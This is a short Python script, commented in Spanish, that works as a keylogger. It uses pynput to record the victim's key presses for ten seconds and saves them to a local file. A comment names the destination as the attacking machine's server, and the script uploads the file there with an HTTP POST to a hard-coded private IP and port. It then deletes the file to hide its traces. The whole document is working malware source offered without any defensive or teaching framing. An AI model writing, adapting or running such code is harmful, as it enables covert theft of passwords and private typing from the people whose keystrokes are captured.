import os
import time
import requests
from pynput import keyboard

#Establece el tiempo de grabación de las teclas (En segundos)
TIEMPO_GRABACION = 10

#Ruta y nombre de archivo para guardar las pulsaciones
RUTA_ARCHIVO = 'pulsaciones.txt'

#URL del servidor del equipo atacante
URL_SERVIDOR = 'http://192.168.0.39:8080'

registros_teclado = []

def on_press(key):
    try:
        registros_teclado.append(key.char)
    except AttributeError:
        pass

def on_release(key):
    if key == keyboard.Key.esc:
        return False

def grabar_pulsaciones():
    # Configurar el oyente del teclado
    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()

    # Esperar el tiempo de grabación
    time.sleep(TIEMPO_GRABACION)

    # Detener el oyente del teclado
    listener.stop()

    # Guardar los registros en el archivo
    with open(RUTA_ARCHIVO, 'w') as archivo:
        archivo.write(''.join(registros_teclado))

    # Enviar archivo al servidor
    try:
        with open(RUTA_ARCHIVO, 'rb') as archivo:
            response = requests.post(URL_SERVIDOR, files={'file': archivo})
        if response.status_code == 200:
            print('Archivo enviado correctamente al servidor.')
        else:
            print('Error al enviar el archivo al servidor.')
    except Exception as e:
        print('Error al enviar el archivo al servidor:', str(e))

    os.remove(RUTA_ARCHIVO)

grabar_pulsaciones()